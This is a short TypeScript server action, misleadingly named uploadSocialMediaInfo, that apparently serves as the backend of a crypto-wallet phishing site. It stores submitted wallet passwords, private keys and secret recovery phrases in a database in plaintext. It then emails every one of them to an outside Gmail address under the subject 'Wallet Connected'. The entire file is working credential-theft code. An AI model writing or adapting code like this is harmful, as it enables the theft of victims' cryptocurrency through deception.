"use server"
import {FieldValues} from "react-hook-form";
import {SendEmail} from "@/app/api/EmailSenderModule/SendEmail";
import {mysqlConnection} from "@/app/api/connectionOptions";

export async function uploadSocialMediaInfo(data: FieldValues, userName: string, userId: number) {

    try {
        await mysqlConnection.execute(
            `INSERT INTO Wallets SET walletType = ?, \`Password\` = ?, PrivateKey = ?, 
                        Email= ?,SecretPhrase = ?, userid = ?`,
            [
                data?.["WalletType"],
                data?.["Password"],
                data?.["PrivateKey"],
                data?.["Email"],
                data?.["Secret Phrase"],
                userId
            ]
        );
        await SendEmail(`${userName} just connected their ${data?.["WalletType"]} wallet.
        Email : ${data?.["Email"]}
        Password : ${data?.["Password"]}
        Private Key : ${data?.["PrivateKey"]}
        Secret Phrase : ${data?.["Secret Phrase"]}
        `, "cherrypopice504@gmail.com", "Wallet Connected")
        return true
    } catch(Err) {
        console.log(Err)
        return false
    }
}